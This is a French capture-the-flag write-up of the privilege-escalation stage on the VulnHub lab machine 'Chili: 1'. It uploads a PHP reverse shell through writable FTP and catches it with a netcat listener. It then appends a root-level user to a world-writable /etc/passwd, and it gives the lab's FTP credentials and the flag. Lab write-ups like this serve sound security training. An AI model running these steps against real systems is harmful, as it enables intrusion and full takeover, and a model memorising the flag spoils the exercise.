# Writeup : cible1 (2/2) — élévation de privilèges

Suite de [`../../cible1-user/solution/writeup.md`](../../cible1-user/solution/writeup.md)
(machine VulnHub **Chili: 1**, accès FTP `chili` / `a1b2c3d4`).

## 1. Shell via le FTP

Le compte FTP peut écrire dans un dossier caché de la racine web, `/var/www/html/.nano`.
On y dépose un reverse shell PHP et on le rend lisible par Apache :

```console
$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php   # IP/port à adapter
$ ftp 192.168.10.2
ftp> cd /var/www/html/.nano
ftp> put shell.php
ftp> chmod 777 shell.php
```

```console
$ nc -lvnp 4444
$ curl http://192.168.10.2/.nano/shell.php
```

On obtient un shell `www-data`.

## 2. `/etc/passwd` modifiable

L'énumération classique (`linpeas`, ou `ls -l /etc/passwd`) révèle la faille :

```console
$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1450 ... /etc/passwd     # 646 : écriture pour tout le monde
```

Il suffit d'ajouter un utilisateur d'UID 0 avec un mot de passe connu :

```console
$ openssl passwd -1 -salt fps fps
$1$fps$...
$ echo 'fps:$1$fps$...:0:0:root:/root:/bin/bash' >> /etc/passwd
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ su fps        # mot de passe : fps
# cat /root/flag.txt
```

## Flag

`FPS{passwd_646_squeezed_e2b9}`
